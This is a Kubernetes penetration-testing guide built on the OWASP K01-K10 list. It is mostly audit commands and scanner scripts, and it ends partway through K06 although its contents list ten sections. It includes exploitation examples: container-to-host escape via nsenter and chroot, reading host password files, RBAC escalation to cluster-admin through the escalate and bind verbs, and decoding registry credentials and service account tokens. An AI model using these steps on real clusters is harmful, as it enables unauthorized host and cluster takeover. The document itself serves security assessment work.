# OWASP Kubernetes Top 10 Penetration Testing Guide
*Complete Testing Methodology for All K01-K10 Vulnerabilities*

## Table of Contents

1. [K01: Insecure Workload Configurations](#k01-insecure-workload-configurations)
2. [K02: Supply Chain Vulnerabilities](#k02-supply-chain-vulnerabilities)
3. [K03: Overly Permissive RBAC Configurations](#k03-overly-permissive-rbac-configurations)
4. [K04: Lack of Centralized Policy Enforcement](#k04-lack-of-centralized-policy-enforcement)
5. [K05: Inadequate Logging and Monitoring](#k05-inadequate-logging-and-monitoring)
6. [K06: Broken Authentication Mechanisms](#k06-broken-authentication-mechanisms)
7. [K07: Missing Network Segmentation Controls](#k07-missing-network-segmentation-controls)
8. [K08: Secrets Management Failures](#k08-secrets-management-failures)
9. [K09: Misconfigured Cluster Components](#k09-misconfigured-cluster-components)
10. [K10: Outdated and Vulnerable Kubernetes Components](#k10-outdated-and-vulnerable-kubernetes-components)

---

# K01: Insecure Workload Configurations

## Overview
Misconfigurations in Kubernetes workload security contexts that grant excessive privileges, expose sensitive data, or allow dangerous operations.

## What to Test

### 1. Privileged Containers
**Vulnerability:** Containers running with `privileged: true` have unrestricted access to host resources.

**Testing Commands:**
```bash
# Identify privileged containers
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[]?.securityContext?.privileged == true) | {name: .metadata.name, namespace: .metadata.namespace}'

# Alternative search in YAML
kubectl get pods --all-namespaces -o yaml | grep -A 10 -B 10 "privileged: true"

# Check security contexts of all pods
kubectl get pods -A -o json | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, containers: [.spec.containers[] | {name: .name, securityContext: .securityContext}]}'
```

**What to Look For:**
- Pods with `privileged: true`
- Containers without `securityContext` defined (runs as root by default)
- Containers with `runAsUser: 0` (root user)

**Exploitation Example:**
```bash
# If you have shell access to a privileged container
kubectl exec -it privileged-pod -- /bin/bash

# Check if privileged
id
cat /proc/self/status | grep Cap

# Escape to host
nsenter -t 1 -m -u -i -n -p /bin/bash
# Now you're root on the host system
```

### 2. Host Namespace Sharing
**Vulnerability:** Pods sharing host namespaces can access host processes, network, and IPC.

**Testing Commands:**
```bash
# Check for host network sharing
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.hostNetwork == true) | {name: .metadata.name, namespace: .metadata.namespace}'

# Check for host PID namespace
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.hostPID == true) | {name: .metadata.name, namespace: .metadata.namespace}'

# Check for host IPC namespace
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.hostIPC == true) | {name: .metadata.name, namespace: .metadata.namespace}'

# Comprehensive host sharing check
kubectl get pods -A -o json | jq '.items[] | select(.spec.hostNetwork == true or .spec.hostPID == true or .spec.hostIPC == true) | {name: .metadata.name, namespace: .metadata.namespace, hostNetwork: .spec.hostNetwork, hostPID: .spec.hostPID, hostIPC: .spec.hostIPC}'
```

**What to Look For:**
- `hostNetwork: true` - Pod uses host networking
- `hostPID: true` - Pod can see host processes
- `hostIPC: true` - Pod can access host IPC

**Exploitation Example:**
```bash
# From pod with hostPID=true
kubectl exec -it host-pid-pod -- ps aux
# You can see all host processes

# From pod with hostNetwork=true
kubectl exec -it host-network-pod -- netstat -tulpn
# You can see all host network connections
```

### 3. Dangerous Volume Mounts
**Vulnerability:** Mounting sensitive host paths allows container breakout.

**Testing Commands:**
```bash
# Check for host path volumes
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[]?.hostPath != null) | {name: .metadata.name, namespace: .metadata.namespace, hostPaths: [.spec.volumes[] | select(.hostPath != null) | .hostPath.path]}'

# Look for root filesystem mounts
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[]?.hostPath?.path == "/") | {name: .metadata.name, namespace: .metadata.namespace}'

# Check for Docker socket mounts
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.volumes[]?.hostPath?.path == "/var/run/docker.sock") | {name: .metadata.name, namespace: .metadata.namespace}'

# Dangerous mount patterns
kubectl get pods -A -o yaml | grep -E "hostPath|/var/run/docker.sock|/proc|/sys|/etc|/"
```

**What to Look For:**
- `/` (root filesystem)
- `/var/run/docker.sock` (Docker socket)
- `/proc`, `/sys`, `/dev` (system directories)
- `/etc` (configuration files)
- Any sensitive host directories

**Exploitation Example:**
```bash
# If root filesystem is mounted to /host
kubectl exec -it dangerous-pod -- ls /host
kubectl exec -it dangerous-pod -- cat /host/etc/passwd
kubectl exec -it dangerous-pod -- chroot /host bash
# Now you're on the host system
```

### 4. Dangerous Capabilities
**Vulnerability:** Linux capabilities that allow privilege escalation or system access.

**Testing Commands:**
```bash
# Check for added capabilities
kubectl get pods -A -o json | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, containers: [.spec.containers[] | select(.securityContext?.capabilities?.add != null) | {name: .name, addedCaps: .securityContext.capabilities.add}]}'

# Check security contexts for capabilities
kubectl get pods -A -o yaml | grep -A 20 -B 5 "capabilities:"

# Look for dangerous capabilities
kubectl get pods -A -o json | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace} as $pod | .spec.containers[] | select(.securityContext?.capabilities?.add != null) | select(.securityContext.capabilities.add[] | test("SYS_ADMIN|SYS_PTRACE|SYS_MODULE|DAC_OVERRIDE|SETUID|SETGID|NET_ADMIN")) | {pod: $pod, container: .name, dangerousCaps: .securityContext.capabilities.add}'
```

**Dangerous Capabilities:**
- `SYS_ADMIN` - System administration
- `SYS_PTRACE` - Process tracing
- `SYS_MODULE` - Kernel module loading
- `DAC_OVERRIDE` - File permission override
- `SETUID/SETGID` - User/group ID changing
- `NET_ADMIN` - Network administration

### 5. Service Account Auto-mounting
**Vulnerability:** Default service account tokens automatically mounted expose API access.

**Testing Commands:**
```bash
# Check pods with service account tokens mounted
kubectl get pods -A -o json | jq '.items[] | select(.spec.automountServiceAccountToken != false) | {name: .metadata.name, namespace: .metadata.namespace, serviceAccount: .spec.serviceAccountName, automount: .spec.automountServiceAccountToken}'

# Find service accounts with auto-mount enabled
kubectl get serviceaccounts -A -o json | jq '.items[] | select(.automountServiceAccountToken != false) | {name: .metadata.name, namespace: .metadata.namespace, automount: .automountServiceAccountToken}'

# Check for default service account usage
kubectl get pods -A -o json | jq '.items[] | select(.spec.serviceAccountName == "default" or .spec.serviceAccountName == null) | {name: .metadata.name, namespace: .metadata.namespace, serviceAccount: (.spec.serviceAccountName // "default")}'
```

**What to Look For:**
- Pods using default service account
- `automountServiceAccountToken` not set to `false`
- Unnecessary service account token mounting

## How to Determine Vulnerability

**Critical Indicators:**
- Any pods with `privileged: true`
- Host namespace sharing (`hostNetwork`, `hostPID`, `hostIPC`)
- Root filesystem mounts (`/` mounted as hostPath)
- Docker socket mounts
- Dangerous capabilities added
- Default service account usage in production

**Testing Script:**
```bash
#!/bin/bash
# K01 Vulnerability Scanner

echo "=== K01: Insecure Workload Configurations Scanner ==="

echo "[+] Checking for privileged containers..."
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[]?.securityContext?.privileged == true) | "\(.metadata.namespace)/\(.metadata.name) - PRIVILEGED"'

echo "[+] Checking for host namespace sharing..."
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.hostNetwork == true or .spec.hostPID == true or .spec.hostIPC == true) | "\(.metadata.namespace)/\(.metadata.name) - HOST_NAMESPACE"'

echo "[+] Checking for dangerous volume mounts..."
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.volumes[]?.hostPath?.path == "/" or .spec.volumes[]?.hostPath?.path == "/var/run/docker.sock") | "\(.metadata.namespace)/\(.metadata.name) - DANGEROUS_MOUNT"'

echo "[+] Checking for containers running as root..."
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[]?.securityContext?.runAsUser == 0 or (.spec.containers[]?.securityContext?.runAsUser == null and .spec.securityContext?.runAsUser == null)) | "\(.metadata.namespace)/\(.metadata.name) - ROOT_USER"'

echo "=== K01 Scan Complete ==="
```

---

# K02: Supply Chain Vulnerabilities

## Overview
Vulnerabilities introduced through the container build pipeline, including malicious images, vulnerable dependencies, and compromised supply chain components.

## What to Test

### 1. Container Image Vulnerability Scanning
**Vulnerability:** Known CVEs in base images and dependencies.

**Testing Commands:**
```bash
# Get all container images in use
kubectl get pods --all-namespaces -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort | uniq

# Scan specific image with Trivy
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL alpine:3.12
trivy image --format json nginx:latest > results.json

# Scan all images in cluster
kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort | uniq | while read image; do
    echo "Scanning $image"
    trivy image --exit-code 1 --severity HIGH,CRITICAL "$image"
done

# Check for images without tags (latest)
kubectl get pods -A -o json | jq -r '.items[] | .spec.containers[] | select(.image | endswith(":latest") or (contains(":") | not)) | .image' | sort | uniq
```

**What to Look For:**
- High/Critical severity CVEs
- Images using `:latest` tag
- Images from untrusted registries
- Base images with known vulnerabilities
- Outdated package versions

### 2. Image Provenance and Signing
**Vulnerability:** Unsigned or unverified container images.

**Testing Commands:**
```bash
# Check image signatures (if using Cosign)
cosign verify --key cosign.pub nginx:latest

# Verify image with Notary (Docker Content Trust)
export DOCKER_CONTENT_TRUST=1
docker pull nginx:latest

# Check admission controllers for image verification
kubectl get validatingadmissionwebhooks
kubectl get mutatingadmissionwebhooks

# Look for image policy enforcement
kubectl get policies.kyverno.io -A
kubectl get constrainttemplates.templates.gatekeeper.sh
```

**What to Look For:**
- Images without digital signatures
- No admission controller enforcing image verification
- Missing image scanning policies
- Lack of SBOM (Software Bill of Materials)

### 3. Registry Security Assessment
**Vulnerability:** Insecure or compromised container registries.

**Testing Commands:**
```bash
# Check image pull secrets
kubectl get secrets --all-namespaces | grep docker-registry
kubectl get secrets --all-namespaces | grep regcred

# Extract registry credentials
kubectl get secret docker-registry-secret -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq '.'

# Test registry access
docker login registry.example.com -u username -p password
docker images
docker push test-image

# Check for private registries in pod specs
kubectl get pods -A -o json | jq -r '.items[] | .spec.containers[].image' | grep -v 'docker.io\|gcr.io\|quay.io'
```

**What to Look For:**
- Weak registry credentials
- Registries accessible without authentication
- Images from unknown/untrusted registries
- Missing registry scanning

### 4. Build Pipeline Security
**Vulnerability:** Compromised CI/CD pipelines introducing malicious code.

**Testing Commands:**
```bash
# Check for CI/CD related service accounts
kubectl get serviceaccounts -A | grep -i -E "jenkins|gitlab|github|azure-devops|circleci"

# Look for build-related secrets
kubectl get secrets -A | grep -i -E "jenkins|gitlab|github|docker|registry|token"

# Check RBAC for build accounts
kubectl describe clusterrolebindings | grep -A 10 -B 5 -i "jenkins\|gitlab\|github"

# Look for deployment automation indicators
kubectl get deployments -A -o json | jq -r '.items[] | select(.metadata.annotations."deployment.kubernetes.io/revision") | "\(.metadata.namespace)/\(.metadata.name) - Auto-deployed"'
```

## How to Determine Vulnerability

**Critical Indicators:**
- High/Critical CVEs in running containers
- Images from untrusted registries
- No image scanning in pipeline
- Unsigned container images
- Weak registry authentication
- Build service accounts with excessive permissions

**Testing Script:**
```bash
#!/bin/bash
# K02 Supply Chain Scanner

echo "=== K02: Supply Chain Vulnerabilities Scanner ==="

echo "[+] Extracting all container images..."
kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort | uniq > images.txt

echo "[+] Checking for latest tags..."
grep -E ':latest$|^[^:]+$' images.txt | while read image; do
    echo "WARNING: $image uses latest or no tag"
done

echo "[+] Checking for unknown registries..."
grep -v -E '^(docker\.io|gcr\.io|quay\.io|registry\.k8s\.io)' images.txt | while read image; do
    echo "INFO: $image from non-standard registry"
done

echo "[+] Scanning images for vulnerabilities..."
if command -v trivy &> /dev/null; then
    cat images.txt | head -5 | while read image; do
        echo "Scanning $image"
        trivy image --severity HIGH,CRITICAL --quiet "$image" | grep -E "HIGH|CRITICAL" | head -3
    done
else
    echo "Install Trivy for vulnerability scanning"
fi

echo "=== K02 Scan Complete ==="
```

---

# K03: Overly Permissive RBAC Configurations

## Overview
RBAC misconfigurations that grant excessive privileges, allowing privilege escalation and unauthorized access to cluster resources.

## What to Test

### 1. Cluster-Admin Privilege Abuse
**Vulnerability:** Unnecessary `cluster-admin` bindings.

**Testing Commands:**
```bash
# Find all cluster-admin bindings
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name == "cluster-admin") | "\(.metadata.name): \(.subjects[]?.kind//\"Unknown\") \(.subjects[]?.name//\"Unknown\") in \(.subjects[]?.namespace//\"cluster-wide\")"'

# Check for cluster-admin bound to default service accounts
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name == "cluster-admin") | select(.subjects[]?.name == "default") | "\(.metadata.name) binds cluster-admin to default SA in \(.subjects[].namespace)"'

# List all cluster-admin users/service accounts
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name == "cluster-admin") | .subjects[]? | "\(.kind): \(.name) (\(.namespace // "cluster-wide"))"'

# Check your current permissions
kubectl auth can-i --list
kubectl auth can-i "*" "*" # Check for admin access
```

**What to Look For:**
- Default service accounts with cluster-admin
- Users with unnecessary cluster-admin access
- Applications with cluster-admin privileges
- Broad cluster-admin assignments

### 2. Dangerous RBAC Verbs
**Vulnerability:** Permissions that allow privilege escalation.

**Testing Commands:**
```bash
# Check for 'escalate' verb (allows creating higher-privilege roles)
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]? == "escalate") | .metadata.name'
kubectl get roles -A -o json | jq -r '.items[] | select(.rules[]?.verbs[]? == "escalate") | "\(.metadata.namespace)/\(.metadata.name)"'

# Check for 'bind' verb (allows binding any role to any subject)
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]? == "bind") | .metadata.name'

# Check for 'impersonate' verb (allows impersonating other users)
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]? == "impersonate") | .metadata.name'

# Check for wildcard permissions
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.verbs[]? == "*") | .metadata.name'
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.resources[]? == "*") | .metadata.name'

# Comprehensive dangerous verb check
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.verbs[]? | test("\\*|escalate|bind|impersonate")) or (.resources[]? | test("\\*"))) | .metadata.name'
```

### 3. Service Account Token Abuse
**Vulnerability:** Service accounts with excessive permissions.

**Testing Commands:**
```bash
# List all service accounts and their bindings
kubectl get serviceaccounts -A

# Check permissions for specific service account
kubectl auth can-i --list --as=system:serviceaccount:default:myapp

# Find service accounts with cluster-wide permissions
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]?.kind == "ServiceAccount") | "\(.metadata.name): \(.subjects[] | select(.kind == "ServiceAccount") | "\(.name) in \(.namespace)")"'

# Test service account token exploitation
SA_TOKEN=$(kubectl get secret $(kubectl get serviceaccount myapp -o jsonpath='{.secrets[0].name}') -o jsonpath='{.data.token}' | base64 -d)
kubectl auth can-i --list --token=$SA_TOKEN
```

### 4. Excessive LIST Permissions
**Vulnerability:** LIST permission exposes all resource data, not just names.

**Testing Commands:**
```bash
# Create test service account with only LIST permission
kubectl create serviceaccount only-list-secrets-sa
kubectl create role only-list-secrets-role --verb=list --resource=secrets
kubectl create rolebinding only-list-secrets-binding --role=only-list-secrets-role --serviceaccount=default:only-list-secrets-sa

# Test LIST vulnerability
TOKEN=$(kubectl get secret $(kubectl get sa only-list-secrets-sa -o jsonpath='{.secrets[0].name}') -o jsonpath='{.data.token}' | base64 -d)

# This should fail (no GET permission)
kubectl get secret mysecret --token=$TOKEN

# This reveals ALL secret data despite no GET permission
kubectl get secrets --token=$TOKEN -o yaml
```

### 5. Cross-Namespace Permission Leaks
**Vulnerability:** Permissions bleeding across namespace boundaries.

**Testing Commands:**
```bash
# Check for cluster-wide role bindings
kubectl get clusterrolebindings -o json | jq -r '.items[] | "\(.metadata.name): \(.roleRef.name) -> \(.subjects[]?.kind//\"N/A\") \(.subjects[]?.name//\"N/A\") in \(.subjects[]?.namespace//\"cluster-wide\")"'

# Check for roles with access to kube-system
kubectl get rolebindings -n kube-system -o json | jq -r '.items[] | "\(.metadata.name): \(.subjects[]?.name//\"N/A\") from \(.subjects[]?.namespace//\"same\")"'

# Look for broad namespace access
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]?.resources[]? == "namespaces") | .metadata.name'
```

## How to Determine Vulnerability

**Critical Indicators:**
- Default service accounts with cluster-admin
- Service accounts with `escalate`, `bind`, or `impersonate` verbs
- Wildcard permissions (`*`) in roles
- LIST permissions without proper GET restrictions
- Cross-namespace access for application accounts

**Exploitation Examples:**

**Escalate Verb Abuse:**
```bash
# If you have 'escalate' permissions
cat << EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: escalated-admin
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
EOF

kubectl create clusterrolebinding escalated-binding --clusterrole=escalated-admin --serviceaccount=default:myapp
```

**Bind Verb Abuse:**
```bash
# If you have 'bind' permissions
kubectl create clusterrolebinding admin-access --clusterrole=cluster-admin --serviceaccount=default:myapp
```

**Testing Script:**
```bash
#!/bin/bash
# K03 RBAC Scanner

echo "=== K03: RBAC Vulnerabilities Scanner ==="

echo "[+] Checking for cluster-admin abuse..."
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name == "cluster-admin") | "CRITICAL: \(.metadata.name) grants cluster-admin to \(.subjects[]?.kind//\"Unknown\") \(.subjects[]?.name//\"Unknown\")"'

echo "[+] Checking for dangerous verbs..."
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.verbs[]? | test("escalate|bind|impersonate"))) | "WARNING: \(.metadata.name) has dangerous verbs"'

echo "[+] Checking for wildcard permissions..."
kubectl get clusterroles -o json | jq -r '.items[] | select(.rules[]? | (.verbs[]? == "*") or (.resources[]? == "*")) | "WARNING: \(.metadata.name) has wildcard permissions"'

echo "[+] Checking service account permissions..."
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]?.kind == "ServiceAccount") | select(.subjects[]?.name == "default") | "WARNING: \(.metadata.name) uses default service account"'

echo "=== K03 Scan Complete ==="
```

---

# K04: Lack of Centralized Policy Enforcement

## Overview
Absence of centralized policy mechanisms to enforce security standards, leading to inconsistent configurations and security gaps.

## What to Test

### 1. Admission Controller Assessment
**Vulnerability:** Missing or misconfigured admission controllers.

**Testing Commands:**
```bash
# List admission controllers
kubectl get validatingadmissionwebhooks
kubectl get mutatingadmissionwebhooks

# Check if Pod Security Standards are enforced
kubectl get namespaces -o json | jq -r '.items[] | select(.metadata.labels."pod-security.kubernetes.io/enforce") | "\(.metadata.name): \(.metadata.labels."pod-security.kubernetes.io/enforce")"'

# Look for OPA Gatekeeper
kubectl get crd | grep gatekeeper
kubectl get constrainttemplates.templates.gatekeeper.sh

# Check Kyverno policies
kubectl get cpol # ClusterPolicy
kubectl get pol -A # Policy

# Test admission controller bypass
cat << EOF > test-privileged-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-privileged
spec:
  containers:
  - name: test
    image: nginx
    securityContext:
      privileged: true
EOF

kubectl apply -f test-privileged-pod.yaml --dry-run=server
```

**What to Look For:**
- No admission controllers configured
- Policies not enforced in all namespaces
- Missing Pod Security Standards
- Lack of image policy enforcement
- No network policy requirements

### 2. Policy Enforcement Gaps
**Vulnerability:** Inconsistent policy application across namespaces.

**Testing Commands:**
```bash
# Check namespace-specific policies
kubectl get namespaces -o json | jq -r '.items[] | "\(.metadata.name): enforce=\(.metadata.labels."pod-security.kubernetes.io/enforce" // "none"), audit=\(.metadata.labels."pod-security.kubernetes.io/audit" // "none")"'

# Look for namespaces without policies
kubectl get namespaces -o json | jq -r '.items[] | select(.metadata.labels."pod-security.kubernetes.io/enforce" == null) | .metadata.name'

# Check resource quotas (policy enforcement)
kubectl get resourcequotas -A

# Check limit ranges
kubectl get limitranges -A

# Test policy consistency
for ns in $(kubectl get ns -o name | cut -d/ -f2); do
    echo "Namespace: $ns"
    kubectl get networkpolicies -n "$ns" 2>/dev/null | grep -c . || echo "  No network policies"
done
```

### 3. Image Policy Enforcement
**Vulnerability:** No policies preventing malicious or vulnerable images.

**Testing Commands:**
```bash
# Try to deploy untrusted image
cat << EOF | kubectl apply --dry-run=server -f -
apiVersion: v1
kind: Pod
metadata:
  name: test-untrusted
spec:
  containers:
  - name: test
    image: malicious/image:latest
EOF

# Try to deploy image without security context
cat << EOF | kubectl apply --dry-run=server -f -
apiVersion: v1
kind: Pod
metadata:
  name: test-no-security-context
spec:
  containers:
  - name: test
    image: nginx
    # No securityContext defined
EOF

# Check for image scanning enforcement
kubectl get validatingadmissionwebhooks -o json | jq -r '.items[] | select(.metadata.name | contains("image-scan")) | .metadata.name'
```

### 4. Resource and Security Policy Gaps
**Vulnerability:** Missing policies for resource limits and security contexts.

**Testing Commands:**
```bash
# Test deploying without resource limits
cat << EOF | kubectl apply --dry-run=server -f -
apiVersion: v1
kind: Pod
metadata:
  name: test-no-limits
spec:
  containers:
  - name: test
    image: nginx
    # No resources defined
EOF

# Test deploying with host namespaces
cat << EOF | kubectl apply --dry-run=server -f -
apiVersion: v1
kind: Pod
metadata:
  name: test-host-network
spec:
  hostNetwork: true
  containers:
  - name: test
    image: nginx
EOF
```

## How to Determine Vulnerability

**Critical Indicators:**
- No admission controllers configured
- Inconsistent policies across namespaces
- Can deploy privileged containers without restrictions
- No image scanning or signing enforcement
- Missing resource quotas and limits
- No network policy enforcement

**Testing Script:**
```bash
#!/bin/bash
# K04 Policy Enforcement Scanner

echo "=== K04: Policy Enforcement Scanner ==="

echo "[+] Checking admission controllers..."
ADMISSION_COUNT=$(kubectl get validatingadmissionwebhooks --no-headers 2>/dev/null | wc -l)
echo "Validating admission webhooks: $ADMISSION_COUNT"
MUTATION_COUNT=$(kubectl get mutatingadmissionwebhooks --no-headers 2>/dev/null | wc -l)
echo "Mutating admission webhooks: $MUTATION_COUNT"

echo "[+] Checking Pod Security Standards..."
kubectl get namespaces -o json | jq -r '.items[] | select(.metadata.labels."pod-security.kubernetes.io/enforce" == null) | "WARNING: \(.metadata.name) has no Pod Security Standard"'

echo "[+] Testing policy enforcement..."
cat << EOF > /tmp/test-privileged.yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-privileged
spec:
  containers:
  - name: test
    image: nginx
    securityContext:
      privileged: true
EOF

if kubectl apply -f /tmp/test-privileged.yaml --dry-run=server &>/dev/null; then
    echo "CRITICAL: Privileged containers allowed"
else
    echo "GOOD: Privileged containers blocked"
fi

rm -f /tmp/test-privileged.yaml

echo "=== K04 Scan Complete ==="
```

---

# K05: Inadequate Logging and Monitoring

## Overview
Insufficient logging and monitoring capabilities that prevent detection of security incidents and compromise forensic analysis.

## What to Test

### 1. Audit Logging Assessment
**Vulnerability:** Missing or insufficient API server audit logging.

**Testing Commands:**
```bash
# Check if audit logging is enabled (requires master node access)
ps aux | grep kube-apiserver | grep -o -- '--audit-log-path=[^ ]*'
ps aux | grep kube-apiserver | grep -o -- '--audit-policy-file=[^ ]*'

# For managed clusters, check audit log configuration
kubectl get events --all-namespaces --sort-by='.lastTimestamp'

# Check if audit events are collected
kubectl get events -A | grep -i audit

# Look for log shipping configuration
kubectl get daemonsets -A | grep -E "fluentd|filebeat|logstash"
kubectl get pods -A | grep -E "logging|elasticsearch|kibana"
```

**What to Look For:**
- No audit logging configuration
- Audit logs not being shipped/stored
- Missing critical event types in audit policy
- No long-term log retention
- Logs not monitored for security events

### 2. Container Runtime Logging
**Vulnerability:** Insufficient container and pod logging.

**Testing Commands:**
```bash
# Check if containers have logging drivers configured
kubectl get pods -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.spec.containers[].name)"'

# Test log collection
kubectl logs -n kube-system deployment/coredns

# Check for centralized logging solution
kubectl get pods -A | grep -E "fluentd|elasticsearch|kibana|splunk|datadog"

# Look for log aggregation services
kubectl get services -A | grep -E "logging|elasticsearch|kibana"

# Check if security events are logged
kubectl get events -A | grep -E "Failed|Error|Warning|Unauthorized"
```

### 3. Security Monitoring Tools
**Vulnerability:** Missing runtime security monitoring.

**Testing Commands:**
```bash
# Check for Falco (runtime security monitoring)
kubectl get pods -A | grep falco
kubectl get daemonsets -A | grep falco

# Look for security monitoring solutions
kubectl get pods -A | grep -E "twistlock|aqua|sysdig|stackrox"

# Check for SIEM integration
kubectl get configmaps -A | grep -E "splunk|elk|siem"

# Test if security events are generated
kubectl run test-pod --image=nginx --rm --restart=Never -- sh -c "touch /tmp/test && rm /tmp/test"
```

### 4. Network Traffic Monitoring
**Vulnerability:** No network flow monitoring or anomaly detection.

**Testing Commands:**
```bash
# Check for network monitoring tools
kubectl get pods -A | grep -E "istio|linkerd|cilium|calico"

# Look for network policy logging
kubectl get networkpolicies -A
kubectl describe networkpolicy -A | grep -i log

# Check for service mesh observability
kubectl get services -A | grep -E "jaeger|zipkin|grafana|prometheus"

# Test network monitoring capabilities
kubectl run nettest --image=busybox --rm --restart=Never -it -- nslookup kubernetes.default
```

### 5. Alerting and Incident Response
**Vulnerability:** Missing alerting on security events.

**Testing Commands:**
```bash
# Check for Prometheus/AlertManager
kubectl get pods -A | grep -E "prometheus|alertmanager"
kubectl get services -A | grep -E "prometheus|alertmanager"

# Look for monitoring rules
kubectl get prometheusrules -A 2>/dev/null
kubectl get servicemonitors -A 2>/dev/null

# Check for incident response automation
kubectl get pods -A | grep -E "webhook|alert|notification"

# Test alerting configuration
kubectl get configmaps -A | grep -E "alert|prometheus|grafana"
```

## How to Determine Vulnerability

**Critical Indicators:**
- No API server audit logging
- No centralized log aggregation
- Missing runtime security monitoring (Falco, etc.)
- No network traffic monitoring
- No alerting on security events
- Logs not retained long-term
- No SIEM integration

**Testing Script:**
```bash
#!/bin/bash
# K05 Logging and Monitoring Scanner

echo "=== K05: Logging and Monitoring Scanner ==="

echo "[+] Checking for logging infrastructure..."
LOGGING_PODS=$(kubectl get pods -A | grep -c -E "fluentd|elasticsearch|kibana|splunk|datadog")
echo "Logging pods found: $LOGGING_PODS"

echo "[+] Checking for security monitoring..."
FALCO_PODS=$(kubectl get pods -A | grep -c falco)
echo "Falco pods found: $FALCO_PODS"

SECURITY_PODS=$(kubectl get pods -A | grep -c -E "twistlock|aqua|sysdig|stackrox")
echo "Security monitoring pods found: $SECURITY_PODS"

echo "[+] Checking for observability stack..."
PROMETHEUS_PODS=$(kubectl get pods -A | grep -c prometheus)
echo "Prometheus pods found: $PROMETHEUS_PODS"

GRAFANA_PODS=$(kubectl get pods -A | grep -c grafana)
echo "Grafana pods found: $GRAFANA_PODS"

echo "[+] Checking recent events..."
RECENT_EVENTS=$(kubectl get events -A --sort-by='.lastTimestamp' | tail -10)
echo "Recent events:"
echo "$RECENT_EVENTS"

echo "[+] Checking for audit events..."
AUDIT_EVENTS=$(kubectl get events -A | grep -c -i audit)
echo "Audit events found: $AUDIT_EVENTS"

if [ $LOGGING_PODS -eq 0 ] && [ $FALCO_PODS -eq 0 ] && [ $PROMETHEUS_PODS -eq 0 ]; then
    echo "CRITICAL: No logging or monitoring infrastructure detected"
fi

echo "=== K05 Scan Complete ==="
```

---

# K06: Broken Authentication Mechanisms

## Overview
Weak, missing, or misconfigured authentication mechanisms that allow unauthorized access to cluster resources.

## What to Test

### 1. Anonymous Access Assessment
**Vulnerability:** Anonymous access enabled to API server or components.

**Testing Commands:**
```bash
# Test anonymous access to API server
curl -k https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces

# Check if anonymous access is enabled
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]?.name == "system:anonymous") | .metadata.name'

# Test anonymous access to different endpoints
curl -k https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/nodes
curl -k https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/secrets

# Check kubelet anonymous access (requires node access)
curl -k https://NODE_IP:10250/metrics
curl -k https://NODE_IP:10250/pods
```

**What to Look For:**
- `system:anonymous` in cluster role bindings
- API endpoints accessible without authentication
- Kubelet with `--anonymous-auth=true`
- Missing authentication requirements

### 2. Weak Service Account Tokens
**Vulnerability:** Long-lived, overprivileged, or improperly managed service account tokens.

**Testing Commands:**
```bash
# List all service account tokens
kubectl get secrets --all-namespaces | grep service-account-token

# Check token auto-mounting
kubectl get serviceaccounts -A -o json | jq -r '.items[] | select(.automountServiceAccountToken != false) | "\(.metadata.namespace)/\(.metadata.name)"'

# Extract and analyze tokens
kubectl get secret myapp-token -o jsonpath='{.data.token}' | base64 -d | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Test token persistence and usage
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .exp

# Check for tokens in environment variables
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].env[]?.name | contains("TOKEN")) | "\(.metadata.namespace)/\(.metadata.name)"'
```

### 3. Certificate-Based Authentication Issues
**Vulnerability:** Weak or compromised client certificates.

**Testing Commands:**
```bash
# Check client certificate authentication (requires access to kubeconfig)
kubectl config view --raw | grep client-certificate

# Look for hardcoded certificates
kubectl get secrets -A | grep tls
kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/tls") | "\(.metadata.namespace)/\(.metadata.name)"'

# Check certificate rotation
kubectl get certificatesigningrequests

# Test certificate-based access
openssl x509 -in client.crt -text -noout | grep "Not After"
```

